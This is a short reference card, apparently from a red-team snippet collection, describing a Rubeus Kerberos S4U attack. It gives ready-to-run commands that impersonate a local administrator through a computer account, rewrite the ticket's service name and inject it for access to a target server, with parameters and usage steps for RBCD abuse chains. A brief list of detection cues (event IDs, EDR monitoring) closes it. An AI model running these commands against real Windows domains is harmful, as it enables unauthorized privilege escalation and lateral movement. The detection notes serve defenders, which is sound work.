# Rubeus-S4U-Computer-Account-Impersonation-Sequence

## Code

```powershell
# The Rubeus execution will fail when trying the S4UProxy step, but the ticket generated by S4USelf will be printed.
Rubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap
# The service name is not included in the TGS ciphered data and can be modified at will.
Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt
```

## Description

This PowerShell code generates an S4U ticket using a computer account to impersonate a local admin, then modifies and injects the TGS for use on a target server. The first command may show a proxy failure, but the S4U2self ticket is valid; the second alters the service for flexible targeting.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| ${computerAccount} | Computer account (e.g., SRV001$) | SRV001$ |
| ${computerDNS} | Computer DNS name | srv001.domain.local |
| ${localAdmin} | Local admin username | localadmin |
| ${TGT} | Base64 TGT | doIF... |
| ${ticket} | Generated TGS base64 | doIF... (from first command) |
| ${ServerDNSName} | Target server DNS | targetserver.domain.local |

## Usage

Run on a domain host with elevated privileges. Export TGT first (e.g., via Rubeus asktgt), substitute variables, and execute. Use the injected ticket for server access like SMB shares. Common in RBCD abuse chains for local escalation.

## Detection

- Kerberos event logs (4768/4769) for S4U from computer accounts.
- Anomalous tgssub-like modifications via EDR monitoring of Rubeus.exe.
- Unexpected admin logons from service principals.
